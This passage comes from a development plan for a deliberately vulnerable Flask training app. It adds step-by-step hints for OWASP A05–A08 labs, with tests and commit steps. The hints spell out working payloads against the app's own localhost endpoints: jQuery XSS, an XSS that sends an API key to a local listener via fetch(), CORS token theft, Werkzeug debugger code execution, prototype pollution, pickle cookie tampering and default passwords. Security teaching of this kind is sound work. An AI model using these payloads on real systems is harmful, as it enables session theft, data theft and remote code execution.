a05_bp = Blueprint(
    "a05_security_misconfiguration", __name__, template_folder="templates", url_prefix="/a05"
)

from app.categories.a05_security_misconfiguration import routes  # noqa: E402,F401
from app.core.nav import CATEGORIES, CategoryNav, ExampleNav  # noqa: E402

CATEGORIES.append(
    CategoryNav(
        id="a05_security_misconfiguration",
        short_id="A05",
        title="Security Misconfiguration",
        blurb="Missing hardening, insecure defaults, and debug/admin interfaces left reachable in production.",
        blueprint_name="a05_security_misconfiguration",
        overview_endpoint="a05_security_misconfiguration.overview",
        examples=[
            ExampleNav(
                id="exposed-backup",
                title="Exposed Database Backup File",
                group="Exposed Files & Directories",
                difficulty="Easy",
                endpoint="a05_security_misconfiguration.backup_exposure",
            ),
            ExampleNav(
                id="directory-listing",
                title="Directory Listing Exposed",
                group="Exposed Files & Directories",
                difficulty="Easy",
                endpoint="a05_security_misconfiguration.directory_listing",
            ),
            ExampleNav(
                id="verbose-errors",
                title="Verbose Error Message Disclosure",
                group="Insecure Response Configuration",
                difficulty="Medium",
                endpoint="a05_security_misconfiguration.inventory_check",
            ),
            ExampleNav(
                id="cors-credentials",
                title="Permissive CORS with Credentials",
                group="Insecure Response Configuration",
                difficulty="Medium",
                endpoint="a05_security_misconfiguration.cors_credentials",
            ),
            ExampleNav(
                id="debug-console-rce",
                title="Exposed Debug Console",
                group="Exposed Debug & Admin Interfaces",
                difficulty="Hard",
                endpoint="a05_security_misconfiguration.internal_diagnostics",
            ),
            ExampleNav(
                id="default-admin-creds",
                title="Forgotten Admin Panel with Default Credentials",
                group="Exposed Debug & Admin Interfaces",
                difficulty="Hard",
                endpoint="a05_security_misconfiguration.admin_login",
            ),
        ],
    )
)
```

Replace it in full with:

```python
from flask import Blueprint

a05_bp = Blueprint(
    "a05_security_misconfiguration", __name__, template_folder="templates", url_prefix="/a05"
)

from app.categories.a05_security_misconfiguration import routes  # noqa: E402,F401
from app.core.nav import CATEGORIES, CategoryNav, ExampleNav  # noqa: E402

CATEGORIES.append(
    CategoryNav(
        id="a05_security_misconfiguration",
        short_id="A05",
        title="Security Misconfiguration",
        blurb="Missing hardening, insecure defaults, and debug/admin interfaces left reachable in production.",
        blueprint_name="a05_security_misconfiguration",
        overview_endpoint="a05_security_misconfiguration.overview",
        examples=[
            ExampleNav(
                id="exposed-backup",
                title="Exposed Database Backup File",
                group="Exposed Files & Directories",
                difficulty="Easy",
                endpoint="a05_security_misconfiguration.backup_exposure",
                hints=[
                    "This page talks about a nightly database backup file. Where might an automated backup job have written that file, and is that location actually protected from outside access?",
                    "The backup file lives at a predictable, web-reachable path under /a05/backups/ — nothing checks who's requesting it.",
                    "Request /a05/backups/db_backup_2024-01-15.sql.bak directly — the server serves the full backup file's contents to anyone, no login or authorization required at all.",
                ],
            ),
            ExampleNav(
                id="directory-listing",
                title="Directory Listing Exposed",
                group="Exposed Files & Directories",
                difficulty="Easy",
                endpoint="a05_security_misconfiguration.directory_listing",
                hints=[
                    "This page hints at an uploads folder. What happens if you visit the folder itself, rather than a specific file inside it?",
                    "Visit /a05/uploads/ — directory listing is enabled, so the server shows you every filename in that folder, whether or not you were ever told it existed.",
                    "One of the listed files, Q3_payroll_export.csv, is directly downloadable at /a05/uploads/Q3_payroll_export.csv — and its contents include real employee SSNs and salaries, exposed purely because the folder listing revealed a filename nobody was supposed to guess.",
                ],
            ),
            ExampleNav(
                id="verbose-errors",
                title="Verbose Error Message Disclosure",
                group="Insecure Response Configuration",
                difficulty="Medium",
                endpoint="a05_security_misconfiguration.inventory_check",
                hints=[
                    "Submit anything into this SKU lookup form and see what the error response actually contains — is it a generic 'something went wrong', or something much more detailed?",
                    "Every submission triggers a real exception, and the app renders the raw exception message AND full Python traceback straight back to you instead of a safe generic error.",
                    "Submit any SKU value at /a05/inventory-check — the error message includes a full PostgreSQL connection string, complete with a real-looking internal hostname, port, database name, and a plaintext password (wh_S3rv1ce_2024!) for the warehouse_svc account, leaked purely by an overly verbose error handler.",
                ],
            ),
            ExampleNav(
                id="cors-credentials",
                title="Permissive CORS with Credentials",
                group="Insecure Response Configuration",
                difficulty="Medium",
                endpoint="a05_security_misconfiguration.cors_credentials",
                hints=[
                    "This page sets a cookie, then a separate API endpoint reads it back. Check that API endpoint's response headers — specifically anything starting with Access-Control-*.",
                    "/a05/api/loyalty-status reflects whatever Origin header the request sent back as Access-Control-Allow-Origin, and also sets Access-Control-Allow-Credentials: true — that combination lets a response be read cross-origin, cookies included, by literally any site.",
                    "From a page on a completely different origin, run: fetch('http://127.0.0.1:5000/a05/api/loyalty-status', {credentials: 'include'}).then(r => r.json()).then(console.log) — because the API reflects your page's Origin and allows credentials, the browser lets this cross-site request through and hands back the victim's real loyalty token, something the same-origin policy exists specifically to prevent.",
                    "Full attack shape: host that fetch() call on any other origin (even a plain local HTML file opened via a small http.server on a different port counts as cross-origin), first visit /a05/cors-credentials in the same browser to plant the cookie, then load your attacker page and watch it read the victim's token straight out of the JSON response.",
                ],
            ),
            ExampleNav(
                id="debug-console-rce",
                title="Exposed Debug Console",
                group="Exposed Debug & Admin Interfaces",
                difficulty="Hard",
                endpoint="a05_security_misconfiguration.internal_diagnostics",
                hints=[
                    "This example mentions a legacy diagnostics tool mounted separately from the main app. Visit its URL directly and look closely at what kind of error page comes back — does it look like anything else in this app?",
                    "The diagnostics route always raises an error, and because debug mode is left on for that mounted tool, the error page isn't a normal error page at all — it's Werkzeug's interactive debugger, a live console running inside the server.",
                    "On that debugger page, click the bottom-most stack frame — a small console icon opens an interactive Python prompt attached to that exact point in the running server process.",
                    "Type a real Python expression into that console and press Enter — e.g. __import__('subprocess').check_output(['id']).decode() — it executes for real, inside the live server process, and returns actual command output. This is genuine remote code execution: nothing stops you from reading any file the server can read or going further from there.",
                ],
            ),
            ExampleNav(
                id="default-admin-creds",
                title="Forgotten Admin Panel with Default Credentials",
                group="Exposed Debug & Admin Interfaces",
                difficulty="Hard",
                endpoint="a05_security_misconfiguration.admin_login",
                hints=[
                    "This is a forgotten internal admin panel. Before trying anything clever, consider: tools like this often ship with default credentials that get forgotten after deployment. What's this tool's typical default username?",
                    "Try the single most common default admin username: admin. The password is a specific, memorable-looking string that was clearly set once and never rotated since — think in terms of the product name plus a deployment year.",
                    "Log in at /a05/admin-login with username admin and password DataVault@2019 — these factory-default credentials were never changed after this internal tool went live, and they grant full access to the admin panel's customer records (names, emails, and password hints) at /a05/admin-panel.",
                ],
            ),
        ],
    )
)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `.venv/bin/pytest tests/test_a05_hints.py -v`
Expected: PASS (1 passed)

- [ ] **Step 5: Run the full test suite**

Run: `.venv/bin/pytest tests/ -q`
Expected: all pass (445 baseline from Task 6 + 1 new = 446).

- [ ] **Step 6: Commit**

```bash
git add app/categories/a05_security_misconfiguration/__init__.py tests/test_a05_hints.py
git commit -m "feat(scoring): author hints for A05 examples

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>"
```

---

## Task 8: A06 Hints — Vulnerable and Outdated Components (6 examples)

**Files:**
- Modify: `app/categories/a06_vulnerable_components/__init__.py`
- Test: `tests/test_a06_hints.py`

**Interfaces:**
- Consumes: `ExampleNav.hints` field (Task 1).
- Produces: nothing consumed by later tasks.

**Reminder:** per the "Note on hint text and HTML escaping" section above
Task 2, write literal `<script>`/`<style>`/`<img ...>` markup quoted in
these hints as plain unescaped characters — Jinja's `{{ hint }}`
autoescaping handles safe display automatically.

- [ ] **Step 1: Write the failing shape test**

Create `tests/test_a06_hints.py`:

```python
from app.core.nav import CATEGORIES


def test_a06_examples_have_well_formed_hint_sequences():
    a06 = next(c for c in CATEGORIES if c.id == "a06_vulnerable_components")
    assert len(a06.examples) == 6
    for example in a06.examples:
        assert 3 <= len(example.hints) <= 5, f"{example.id} has {len(example.hints)} hints"
        assert all(hint.strip() for hint in example.hints), f"{example.id} has an empty hint"
        assert len(set(example.hints)) == len(example.hints), f"{example.id} has duplicate hints"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/bin/pytest tests/test_a06_hints.py -v`
Expected: FAIL — every example currently has `hints == []`.

- [ ] **Step 3: Add hints to each `ExampleNav`**

Modify `app/categories/a06_vulnerable_components/__init__.py`. Current
file:

```python
from flask import Blueprint

a06_bp = Blueprint(
    "a06_vulnerable_components", __name__, template_folder="templates", url_prefix="/a06"
)

from app.categories.a06_vulnerable_components import routes  # noqa: E402,F401
from app.core.nav import CATEGORIES, CategoryNav, ExampleNav  # noqa: E402

CATEGORIES.append(
    CategoryNav(
        id="a06_vulnerable_components",
        short_id="A06",
        title="Vulnerable and Outdated Components",
        blurb="Outdated, unpatched dependencies with known public CVEs still running in production.",
        blueprint_name="a06_vulnerable_components",
        overview_endpoint="a06_vulnerable_components.overview",
        examples=[
            ExampleNav(
                id="version-disclosure",
                title="Component Version Disclosure",
                group="Component Reconnaissance",
                difficulty="Easy",
                endpoint="a06_vulnerable_components.component_inventory",
            ),
            ExampleNav(
                id="outdated-jquery-detection",
                title="Outdated Vulnerable JS Library Detection",
                group="Component Reconnaissance",
                difficulty="Easy",
                endpoint="a06_vulnerable_components.legacy_widgets",
            ),
            ExampleNav(
                id="jquery-dom-xss",
                title="jQuery DOM XSS via Vulnerable htmlPrefilter",
                group="Vulnerable Library: jQuery HTML Sanitization Bypass",
                difficulty="Medium",
                endpoint="a06_vulnerable_components.comment_preview",
            ),
            ExampleNav(
                id="lodash-prototype-pollution",
                title="Lodash Prototype Pollution via _.defaultsDeep()",
                group="Vulnerable Library: Lodash Prototype Pollution",
                difficulty="Medium",
                endpoint="a06_vulnerable_components.notification_preferences",
            ),
            ExampleNav(
                id="jquery-xss-session-theft",
                title="jQuery DOM XSS Chained to Session Token Theft",
                group="Vulnerable Library: jQuery HTML Sanitization Bypass",
                difficulty="Hard",
                endpoint="a06_vulnerable_components.account_preview",
            ),
            ExampleNav(
                id="prototype-pollution-bypass",
                title="Prototype Pollution Bypasses a Client-Side Access Check",
                group="Vulnerable Library: Lodash Prototype Pollution",
                difficulty="Hard",
                endpoint="a06_vulnerable_components.admin_tools_panel",
            ),
        ],
    )
)
```

Replace it in full with:

```python
from flask import Blueprint

a06_bp = Blueprint(
    "a06_vulnerable_components", __name__, template_folder="templates", url_prefix="/a06"
)

from app.categories.a06_vulnerable_components import routes  # noqa: E402,F401
from app.core.nav import CATEGORIES, CategoryNav, ExampleNav  # noqa: E402

CATEGORIES.append(
    CategoryNav(
        id="a06_vulnerable_components",
        short_id="A06",
        title="Vulnerable and Outdated Components",
        blurb="Outdated, unpatched dependencies with known public CVEs still running in production.",
        blueprint_name="a06_vulnerable_components",
        overview_endpoint="a06_vulnerable_components.overview",
        examples=[
            ExampleNav(
                id="version-disclosure",
                title="Component Version Disclosure",
                group="Component Reconnaissance",
                difficulty="Easy",
                endpoint="a06_vulnerable_components.component_inventory",
                hints=[
                    "This page was built as an internal ops dashboard and never got the authentication it was supposed to have. What does an unauthenticated visitor see if they just visit it directly?",
                    "No login is required to reach /a06/component-inventory — just navigate there and read what it shows you.",
                    "Visit /a06/component-inventory and note the exact versions listed for \"jQuery (Legacy Widgets bundle)\" and \"Lodash (Legacy Widgets bundle)\" — then look each one up against a public vulnerability database like the GitHub Advisory Database or NVD to find their known CVEs.",
                ],
            ),
            ExampleNav(
                id="outdated-jquery-detection",
                title="Outdated Vulnerable JS Library Detection",
                group="Component Reconnaissance",
                difficulty="Easy",
                endpoint="a06_vulnerable_components.legacy_widgets",
                hints=[
                    "This category's other jQuery examples load a script from somewhere — what if you fetched that file directly instead of just using it?",
                    "Look at the page source of any \"Vulnerable Library: jQuery\" example and find the <script src=...> tag pointing at /static/vendor/jquery-vulnerable/.",
                    "Fetch /static/vendor/jquery-vulnerable/jquery-1.12.4.js directly and read its first few lines — jQuery's own header comment states the exact version, v1.12.4, which you can then cross-reference against a public CVE database (it falls inside the range affected by GHSA-gxr4-xjj5-5px2 / CVE-2020-11022 / CVE-2020-11023).",
                ],
            ),
            ExampleNav(
                id="jquery-dom-xss",
                title="jQuery DOM XSS via Vulnerable htmlPrefilter",
                group="Vulnerable Library: jQuery HTML Sanitization Bypass",
                difficulty="Medium",
                endpoint="a06_vulnerable_components.comment_preview",
                hints=[
                    "This widget's server-side code has no obvious bug — the flaw lives inside the vendored jQuery library's own HTML-handling logic, specifically the code path .html() relies on to make raw input \"safe\".",
                    "jQuery's htmlPrefilter (versions before 3.5.0) has a regex that mishandles a specific kind of self-closing tag, letting markup after it escape its intended parsing context. Try a self-closing <style /> tag followed by something that executes on error.",
                    "Paste this exact payload into the comment box and click Preview: <style><style /><img src=1 onerror=alert(document.domain)> — the self-closing <style /> gets rewritten by htmlPrefilter in a way that lets the following <img onerror=...> execute as live markup instead of staying inert style text.",
                ],
            ),
            ExampleNav(
                id="lodash-prototype-pollution",
                title="Lodash Prototype Pollution via _.defaultsDeep()",
                group="Vulnerable Library: Lodash Prototype Pollution",
                difficulty="Medium",
                endpoint="a06_vulnerable_components.notification_preferences",
                hints=[
                    "This feature merges your submitted JSON over some default settings using a Lodash deep-merge function. What happens if your JSON includes a key with special meaning in JavaScript's own object model, like \"constructor\" or \"prototype\"?",
                    "Lodash's _.defaultsDeep() before 4.17.12 walks every key in your input recursively, including \"constructor\" and \"prototype\", without checking if it's about to write onto Object.prototype instead of a normal data object.",
                    "Paste this exact payload into the preferences box and click Apply: {\"constructor\": {\"prototype\": {\"isAdmin\": true}}} — then watch the \"Fresh object check\" panel flip to true, proving a brand-new, unrelated object now inherits a property you never gave it because Object.prototype itself got polluted.",
                ],
            ),
            ExampleNav(
                id="jquery-xss-session-theft",
                title="jQuery DOM XSS Chained to Session Token Theft",
                group="Vulnerable Library: jQuery HTML Sanitization Bypass",
                difficulty="Hard",
                endpoint="a06_vulnerable_components.account_preview",
                hints=[
                    "This page has the exact same vulnerable comment-preview widget as the Medium-tier jQuery DOM XSS example — but now there's something genuinely valuable sitting in the DOM right next to it. What could a real attacker do with script execution beyond just popping an alert box?",
                    "Once you can execute arbitrary JavaScript via the same htmlPrefilter flaw, you can read anything else on the page (like the element showing \"Your API Key\") and send it somewhere the attacker controls, e.g. via fetch().",
                    "Start a listener to act as the attacker's collector: python3 -m http.server 9000 in a separate terminal.",
                    "Paste this exact payload into the comment box and click Preview: <style><style /><img src=1 onerror=\"fetch('http://127.0.0.1:9000/collect?key=' + encodeURIComponent(document.getElementById('api-key-value').innerText))\"> — watch your listener's access log receive a real GET request carrying the API key, exfiltrated by your own browser with no further interaction from you.",
                ],
            ),
            ExampleNav(
                id="prototype-pollution-bypass",
                title="Prototype Pollution Bypasses a Client-Side Access Check",
                group="Vulnerable Library: Lodash Prototype Pollution",
                difficulty="Hard",
                endpoint="a06_vulnerable_components.admin_tools_panel",
                hints=[
                    "This page reuses the exact same vulnerable Lodash merge from the Medium-tier Prototype Pollution example — but here, something that reads the polluted property actually gates real functionality instead of just a decorative flag. What might that be?",
                    "There's a hidden \"Admin Tools\" section on this page, and a client-side check somewhere decides whether to reveal it based on a property of a freshly-created object.",
                    "Paste this exact payload into the preferences box and click Apply: {\"constructor\": {\"prototype\": {\"isAdmin\": true}}}",
                    "The visibility check is roughly if (({}).isAdmin) { showPanel(); } against a brand-new empty object — once Object.prototype.isAdmin is polluted by your payload, that check (and every other naive check like it across the whole page) starts passing, revealing the hidden Admin Tools panel with no legitimate access at all.",
                ],
            ),
        ],
    )
)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `.venv/bin/pytest tests/test_a06_hints.py -v`
Expected: PASS (1 passed)

- [ ] **Step 5: Run the full test suite**

Run: `.venv/bin/pytest tests/ -q`
Expected: all pass (446 baseline from Task 7 + 1 new = 447).

- [ ] **Step 6: Commit**

```bash
git add app/categories/a06_vulnerable_components/__init__.py tests/test_a06_hints.py
git commit -m "feat(scoring): author hints for A06 examples

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>"
```

---

## Task 9: A07 Hints — Identification and Authentication Failures (6 examples)

**Files:**
- Modify: `app/categories/a07_auth_failures/__init__.py`
- Test: `tests/test_a07_hints.py`

**Interfaces:**
- Consumes: `ExampleNav.hints` field (Task 1).
- Produces: nothing consumed by later tasks.

- [ ] **Step 1: Write the failing shape test**

Create `tests/test_a07_hints.py`:

```python
from app.core.nav import CATEGORIES


def test_a07_examples_have_well_formed_hint_sequences():
    a07 = next(c for c in CATEGORIES if c.id == "a07_auth_failures")
    assert len(a07.examples) == 6
    for example in a07.examples:
        assert 3 <= len(example.hints) <= 5, f"{example.id} has {len(example.hints)} hints"
        assert all(hint.strip() for hint in example.hints), f"{example.id} has an empty hint"
        assert len(set(example.hints)) == len(example.hints), f"{example.id} has duplicate hints"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/bin/pytest tests/test_a07_hints.py -v`
Expected: FAIL — every example currently has `hints == []`.

- [ ] **Step 3: Add hints to each `ExampleNav`**

Modify `app/categories/a07_auth_failures/__init__.py`. Current file:

```python
from flask import Blueprint

a07_bp = Blueprint(
    "a07_auth_failures", __name__, template_folder="templates", url_prefix="/a07"
)

from app.categories.a07_auth_failures import routes  # noqa: E402,F401
from app.categories.a07_auth_failures.seed import seed_a07_accounts  # noqa: E402
from app.core.nav import CATEGORIES, CategoryNav, ExampleNav  # noqa: E402

CATEGORIES.append(
    CategoryNav(
        id="a07_auth_failures",
        short_id="A07",
        title="Identification and Authentication Failures",
        blurb="Broken login protections and session-lifecycle handling that let attackers impersonate real users.",
        blueprint_name="a07_auth_failures",
        overview_endpoint="a07_auth_failures.overview",
        examples=[
            ExampleNav(
                id="brute-force-login",
                title="No Rate Limiting Enables Brute Force",
                group="Brute Force & Credential Stuffing",
                difficulty="Easy",
                endpoint="a07_auth_failures.brute_force_login",
            ),
            ExampleNav(
                id="credential-stuffing",
                title="Credential Stuffing Across Multiple Accounts",
                group="Brute Force & Credential Stuffing",
                difficulty="Medium",
                endpoint="a07_auth_failures.credential_stuffing",
            ),
            ExampleNav(
                id="session-in-url",
                title="Session Identifier Exposed in URL",
                group="Session Identity & Lifecycle",
                difficulty="Easy",
                endpoint="a07_auth_failures.share_session_link",
            ),
            ExampleNav(
                id="session-survives-logout",
                title="Session Not Invalidated on Logout",
                group="Session Identity & Lifecycle",
                difficulty="Medium",
                endpoint="a07_auth_failures.session_survives_logout",
            ),
            ExampleNav(
                id="session-fixation",
                title="Session Fixation",
                group="Session Identity & Lifecycle",
                difficulty="Hard",
                endpoint="a07_auth_failures.session_fixation_demo",
            ),
            ExampleNav(
                id="mfa-bypass",
                title="Bypassable Multi-Factor Authentication",
                group="Multi-Factor Authentication Bypass",
                difficulty="Hard",
                endpoint="a07_auth_failures.mfa_login",
            ),
        ],
        seed_fn=seed_a07_accounts,
    )
)
```

Replace it in full with:

```python
from flask import Blueprint

a07_bp = Blueprint(
    "a07_auth_failures", __name__, template_folder="templates", url_prefix="/a07"
)

from app.categories.a07_auth_failures import routes  # noqa: E402,F401
from app.categories.a07_auth_failures.seed import seed_a07_accounts  # noqa: E402
from app.core.nav import CATEGORIES, CategoryNav, ExampleNav  # noqa: E402

CATEGORIES.append(
    CategoryNav(
        id="a07_auth_failures",
        short_id="A07",
        title="Identification and Authentication Failures",
        blurb="Broken login protections and session-lifecycle handling that let attackers impersonate real users.",
        blueprint_name="a07_auth_failures",
        overview_endpoint="a07_auth_failures.overview",
        examples=[
            ExampleNav(
                id="brute-force-login",
                title="No Rate Limiting Enables Brute Force",
                group="Brute Force & Credential Stuffing",
                difficulty="Easy",
                endpoint="a07_auth_failures.brute_force_login",
                hints=[
                    "This login form checks a username and password with no protection against repeated attempts. What happens if you submit the wrong password many times in a row?",
                    "There is no lockout, no delay, no CAPTCHA, and no rate limiting on this endpoint — every failed attempt returns instantly and lets you try again immediately.",
                    "Pick a real seeded username (e.g. dana) and try common weak passwords against /a07/customer-login in quick succession — nothing stops you from guessing until one works. (The seeded password for dana is a very common one.)",
                ],
            ),
            ExampleNav(
                id="credential-stuffing",
                title="Credential Stuffing Across Multiple Accounts",
                group="Brute Force & Credential Stuffing",
                difficulty="Medium",
                endpoint="a07_auth_failures.credential_stuffing",
                hints=[
                    "This is a different login form (the loyalty portal) with no special protection of its own. Where might real attackers get lists of already-known username/password pairs?",
                    "Real credential stuffing reuses username/password pairs leaked from OTHER breaches, tried here on the assumption people reuse passwords. This endpoint has the exact same missing rate-limiting as the customer login.",
                    "Try the seeded accounts morgan, priya, and theo against /a07/loyalty-portal-login with a few common/weak password guesses each — the same unprotected check that let you brute-force one account earlier reuses that pattern across multiple identities, exactly like real credential-stuffing attacks.",
                ],
            ),
            ExampleNav(
                id="session-in-url",
                title="Session Identifier Exposed in URL",
                group="Session Identity & Lifecycle",
                difficulty="Easy",
                endpoint="a07_auth_failures.share_session_link",
                hints=[
                    "This page offers a 'share session link' feature. What sensitive value might end up embedded directly in that shareable URL?",
                    "The share link puts your session id in the URL itself (?sid=...) rather than relying only on your cookie — URLs get logged, cached, shared in chat, and stored in browser history far more readily than cookies do.",
                    "Copy the 'share session link' URL shown on this page (it contains ?sid=<your session id>), open it in a different browser or incognito window — you're instantly logged in as that same session, no cookie needed, proving anyone who obtains that URL can hijack the session.",
                ],
            ),
            ExampleNav(
                id="session-survives-logout",
                title="Session Not Invalidated on Logout",
                group="Session Identity & Lifecycle",
                difficulty="Medium",
                endpoint="a07_auth_failures.session_survives_logout",
                hints=[
                    "This example is about what logging out actually invalidates. Does clicking 'log out' destroy your session on the SERVER, or only clear something on your own browser?",
                    "The logout route clears the client's cookie, but never deletes the corresponding session record stored server-side — the old session id, if you still have a copy of it, remains just as valid as before.",
                    "Before logging out, note your current session id (visible via your browser's cookie inspector, or the ?sid= value from the session-in-url example). Log out normally, then manually set your session cookie back to that same saved id.",
                    "After restoring the old session id post-logout, visit /a07/session-survives-logout again — you're still recognized as logged in, proving the server-side session was never actually invalidated.",
                ],
            ),
            ExampleNav(
                id="session-fixation",
                title="Session Fixation",
                group="Session Identity & Lifecycle",
                difficulty="Hard",
                endpoint="a07_auth_failures.session_fixation_demo",
                hints=[
                    "This vulnerability is about WHO chooses the session id, and WHEN. Does this app ever generate a fresh session id at the moment a user logs in?",
                    "Look at how a session id gets assigned: /a07/account?sid=<anything> will adopt whatever id you supply as a brand-new, real session if it doesn't already exist yet — the server trusts client-supplied ids, not just ones it minted itself.",
                    "An attacker picks their own session id ahead of time (e.g. planted-by-attacker-1234), visits /a07/account?sid=planted-by-attacker-1234 to register it as a live session, then tricks a victim into visiting the SAME URL before logging in.",
                    "When the victim logs in while using that planted sid, the app never rotates it to a fresh one on authentication — so the attacker, who already knows that exact sid value, can present it themselves afterward and be authenticated as the victim with no credentials of their own.",
                ],
            ),
            ExampleNav(
                id="mfa-bypass",
                title="Bypassable Multi-Factor Authentication",
                group="Multi-Factor Authentication Bypass",
                difficulty="Hard",
                endpoint="a07_auth_failures.mfa_login",
                hints=[
                    "This login has two steps: password, then a verification code. Once you've completed just the FIRST step, what does the server actually know about your session?",
                    "After a successful password check, the session is updated with your username but mfa_verified is explicitly set to False — the app clearly intends you to complete step two before being treated as logged in.",
                    "Look at what the dashboard route actually checks before granting access — does it verify mfa_verified, or only that a username is present on the session at all?",
                    "Log in with a valid username/password at /a07/mfa-login (this sets your session's username but not mfa_verified), then skip the code-entry step entirely and navigate directly to /a07/mfa-dashboard — the dashboard only checks that a username is set, never that MFA was actually completed, so you're in.",
                ],
            ),
        ],
        seed_fn=seed_a07_accounts,
    )
)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `.venv/bin/pytest tests/test_a07_hints.py -v`
Expected: PASS (1 passed)

- [ ] **Step 5: Run the full test suite**

Run: `.venv/bin/pytest tests/ -q`
Expected: all pass (447 baseline from Task 8 + 1 new = 448).

- [ ] **Step 6: Commit**

```bash
git add app/categories/a07_auth_failures/__init__.py tests/test_a07_hints.py
git commit -m "feat(scoring): author hints for A07 examples

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>"
```

---

## Task 10: A08 Hints — Software and Data Integrity Failures (6 examples)

**Files:**
- Modify: `app/categories/a08_integrity_failures/__init__.py`
- Test: `tests/test_a08_hints.py`

**Interfaces:**
- Consumes: `ExampleNav.hints` field (Task 1).
- Produces: nothing consumed by later tasks.

- [ ] **Step 1: Write the failing shape test**

Create `tests/test_a08_hints.py`:

```python
from app.core.nav import CATEGORIES


def test_a08_examples_have_well_formed_hint_sequences():
    a08 = next(c for c in CATEGORIES if c.id == "a08_integrity_failures")
    assert len(a08.examples) == 6
    for example in a08.examples:
        assert 3 <= len(example.hints) <= 5, f"{example.id} has {len(example.hints)} hints"
        assert all(hint.strip() for hint in example.hints), f"{example.id} has an empty hint"
        assert len(set(example.hints)) == len(example.hints), f"{example.id} has duplicate hints"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/bin/pytest tests/test_a08_hints.py -v`
Expected: FAIL — every example currently has `hints == []`.

- [ ] **Step 3: Add hints to each `ExampleNav`**

Modify `app/categories/a08_integrity_failures/__init__.py`. Current file:

```python
from flask import Blueprint

a08_bp = Blueprint(
    "a08_integrity_failures", __name__, template_folder="templates", url_prefix="/a08"
)

from app.categories.a08_integrity_failures import routes  # noqa: E402,F401
from app.core.nav import CATEGORIES, CategoryNav, ExampleNav  # noqa: E402

CATEGORIES.append(
    CategoryNav(
        id="a08_integrity_failures",
        short_id="A08",
        title="Software and Data Integrity Failures",
        blurb="Deserialized data, installed code, and signed tokens trusted without ever verifying they weren't tampered with.",
        blueprint_name="a08_integrity_failures",
        overview_endpoint="a08_integrity_failures.overview",
        examples=[
            ExampleNav(
                id="cart-pickle-tampering",
                title="Pickle Cart Tampering",
                group="Insecure Deserialization",
                difficulty="Easy",
                endpoint="a08_integrity_failures.cart",
            ),
            ExampleNav(
                id="plugin-marketplace-tampering",
                title="Unsigned Plugin Content Trust",
                group="Unsigned Software Updates & Supply Chain",
                difficulty="Medium",
                endpoint="a08_integrity_failures.plugin_marketplace",
            ),
            ExampleNav(
                id="unchecked-signature-cookie",
                title="Unchecked Signature on Preferences Cookie",
                group="Broken Signature Verification",
                difficulty="Easy",
                endpoint="a08_integrity_failures.preferences",
            ),
            ExampleNav(
                id="jwt-alg-none-bypass",
                title="JWT alg:none Signature Bypass",
                group="Broken Signature Verification",
                difficulty="Medium",
                endpoint="a08_integrity_failures.admin_api",
            ),
            ExampleNav(
                id="cart-pickle-rce",
                title="Pickle Deserialization RCE",
                group="Insecure Deserialization",
                difficulty="Hard",
                endpoint="a08_integrity_failures.cart_rce_demo",
            ),
            ExampleNav(
                id="plugin-marketplace-rce",
                title="Unsigned Plugin Installation Leads to RCE",
                group="Unsigned Software Updates & Supply Chain",
                difficulty="Hard",
                endpoint="a08_integrity_failures.plugin_marketplace_rce_demo",
            ),
        ],
    )
)
```

Replace it in full with:

```python
from flask import Blueprint

a08_bp = Blueprint(
    "a08_integrity_failures", __name__, template_folder="templates", url_prefix="/a08"
)

from app.categories.a08_integrity_failures import routes  # noqa: E402,F401
from app.core.nav import CATEGORIES, CategoryNav, ExampleNav  # noqa: E402

CATEGORIES.append(
    CategoryNav(
        id="a08_integrity_failures",
        short_id="A08",
        title="Software and Data Integrity Failures",
        blurb="Deserialized data, installed code, and signed tokens trusted without ever verifying they weren't tampered with.",
        blueprint_name="a08_integrity_failures",
        overview_endpoint="a08_integrity_failures.overview",
        examples=[
            ExampleNav(
                id="cart-pickle-tampering",
                title="Pickle Cart Tampering",
                group="Insecure Deserialization",
                difficulty="Easy",
                endpoint="a08_integrity_failures.cart",
                hints=[
                    "The cart's contents are stored client-side in a cookie. What happens if you fully control the bytes you send back — does the server ever verify they haven't been altered before trusting them?",
                    "The a08_cart cookie is just base64-encoded pickle data with no HMAC or signature attached — the server deserializes whatever it receives, no questions asked.",
                    "Craft your own pickle payload locally: python3 -c \"import pickle, base64; print(base64.b64encode(pickle.dumps({'item': 'Widget', 'price': 0.01})).decode())\" — then set your a08_cart cookie to that printed value and reload the page. The price shows $0.01, fully accepted.",
                ],
            ),
            ExampleNav(
                id="plugin-marketplace-tampering",
                title="Unsigned Plugin Content Trust",
                group="Unsigned Software Updates & Supply Chain",
                difficulty="Medium",
                endpoint="a08_integrity_failures.plugin_marketplace",
                hints=[
                    "This marketplace installs a plugin from any URL you give it. What's missing between 'fetch some code from a URL' and 'trust it's the real thing'?",
                    "There's no checksum or signature check comparing the fetched content against any known-good source — any URL serving Python-shaped text is treated as equally official.",
                    "Download both the 'official' plugin and the deliberately substituted demo plugin from this same app, compare their content, then install the substituted one via the form using its own download URL — the marketplace accepts it exactly as readily as the real one, with zero warning.",
                    "Exact URLs: install http://127.0.0.1:5000/a08/plugin-marketplace/official-plugin.py first, then http://127.0.0.1:5000/a08/plugin-marketplace/malicious-plugin-demo.py — both install identically even though their content differs.",
                ],
            ),
            ExampleNav(
                id="unchecked-signature-cookie",
                title="Unchecked Signature on Preferences Cookie",
                group="Broken Signature Verification",
                difficulty="Easy",
                endpoint="a08_integrity_failures.preferences",
                hints=[
                    "This preferences cookie includes a signature field. Does the code that reads the cookie back actually check it, or just read the other fields and move on?",
                    "A verification function for this signature exists elsewhere in the codebase — but look at where the cookie is actually parsed on page load, and check whether that verification function is ever called there.",
                    "Set your a08_prefs cookie directly to {\"theme\": \"dark\", \"premium_unlocked\": true, \"sig\": \"not-a-real-signature\"} and reload — premium unlocks despite an obviously fake signature, because the code path that reads the cookie never calls the verification function at all.",
                ],
            ),
            ExampleNav(
                id="jwt-alg-none-bypass",
                title="JWT alg:none Signature Bypass",
                group="Broken Signature Verification",
                difficulty="Medium",
                endpoint="a08_integrity_failures.admin_api",
                hints=[
